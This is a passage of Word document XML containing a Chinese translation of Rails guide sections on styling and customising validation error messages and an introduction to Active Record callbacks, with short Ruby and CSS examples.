          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">如果你给这些选项中的任意一个传递了 </w:t>
      </w:r>
      <w:r w:rsidRPr="00E62DCB">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r w:rsidRPr="00E62DCB">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">，相应片段的整个 </w:t>
      </w:r>
      <w:r w:rsidRPr="00E62DCB">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>div</w:t>
      </w:r>
      <w:r w:rsidRPr="00E62DCB">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 元素都将不显示</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF52385"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9.2 定制错误信息的 CSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A606DE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用来</w:t>
      </w:r>
      <w:r w:rsidRPr="00252018">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>定制错误信息样式的 CSS 选择器</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>有以下几种：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1065D0F4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>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.field_with_errors</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidRPr="00252018">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>表单中错误字段</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00252018">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>标签</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的样式。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D0DC86E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>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#error_explanation</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidRPr="00252018">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">包含具体错误信息的 </w:t>
      </w:r>
      <w:r w:rsidRPr="00252018">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>div</w:t>
      </w:r>
      <w:r w:rsidRPr="00252018">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 元素的样式</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04CEE8C0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>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#error_explanation h2</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidRPr="00252018">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">包含具体错误信息的 </w:t>
      </w:r>
      <w:r w:rsidRPr="00252018">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>div</w:t>
      </w:r>
      <w:r w:rsidRPr="00252018">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 元素的标题样式</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10C3B77D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>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#error_explanation p</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>div</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 元素中</w:t>
      </w:r>
      <w:r w:rsidRPr="00252018">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">标题下面防止具体错误信息段落的样式，位于 </w:t>
      </w:r>
      <w:r w:rsidRPr="00252018">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>div</w:t>
      </w:r>
      <w:r w:rsidRPr="00252018">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 标题的右下方</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F62F08E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>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#error_explanation ul li</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidRPr="00252018">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>各自错误信息对应的列表元素的样式</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51B34FA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如果使用了脚手架来生成代码，将会自动生成文件 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets/stylesheets/scaffolds.css.scss</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，用来定义如上图中所示的红色风格的样式。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6702975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两种 helper 方法都可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:class</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:id</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来设置相应的名称。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69760714"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9.3 自定义错误信息的 HTML</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FFA75D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错误字段的 HTML 是通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionView::Base.field_error_proc</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来定义的。这个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Proc</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 需要如下两个参数：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="768872D4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>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一段定义 HTML 标签的字符串。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BAA1D3C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>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一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionView::Helpers::InstanceTag</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 实例。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7830682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下面是一个简单的示例，我们改变了 Rails 默认总是将所有错误的</w:t>
      </w:r>
      <w:r w:rsidRPr="00B06291">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>字</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>段信息显示在表单之前的行为。而是</w:t>
      </w:r>
      <w:r w:rsidRPr="00B06291">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">将错误信息包装在一个拥有 </w:t>
      </w:r>
      <w:r w:rsidRPr="00B06291">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>validation-error</w:t>
      </w:r>
      <w:r w:rsidRPr="00B06291">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> CSS 类的 </w:t>
      </w:r>
      <w:r w:rsidRPr="00B06291">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>span</w:t>
      </w:r>
      <w:r w:rsidRPr="00B06291">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 元素中</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。这里 </w:t>
      </w:r>
      <w:r w:rsidRPr="00B06291">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>input</w:t>
      </w:r>
      <w:r w:rsidRPr="00B06291">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 元素不会包装在 </w:t>
      </w:r>
      <w:r w:rsidRPr="00B06291">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>div</w:t>
      </w:r>
      <w:r w:rsidRPr="00B06291">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 元素中</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，这样我们就摆脱了文本字段被红色边框围绕的烦恼。你还可以在 CSS 中通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>validation-error</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来进一步定义你想要的样式。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="7B0CD429" w14:textId="77777777" w:rsidTr="00B06291">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7417920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ActionView::Base.field_error_proc = Proc.new</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|html_tag, instance|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="474A00D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errors = Array(instance.error_message).join(',')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D1014E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%(#{html_tag}&lt;span class="validation-error"&gt;&amp;nbsp;#{errors}&lt;/span&gt;).html_safe</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CFE83A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363421E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结果如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0905823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2C473073" wp14:editId="421A8791">
            <wp:extent cx="3905250" cy="504825"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="6" name="图片 6" descr="Validation error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lidation error messages"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId204" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3905250" cy="504825"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="336270DF"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10 回调简介</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6290E78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回调就是</w:t>
      </w:r>
      <w:r w:rsidRPr="00B06291">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>在对象特定的生命周期可以被调用的方法</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。通过使用回调，我们可以让代码在 Active Record 对象创建，保存，更新，删除，校验或者从数据库载入时被运行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C0E77E3"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10.1 回调注册</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="021A1D8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使用回调前，你必须先要注册他们。你可像平常一样声明一个方法，然后使用 macro-style 类方法注册他们为回调：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6216"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="137B7706" w14:textId="77777777" w:rsidTr="00A1468F">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3EEA8FD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User &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="479D0AD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:login, :email,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6EB6B65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27F3E8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A1468F">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
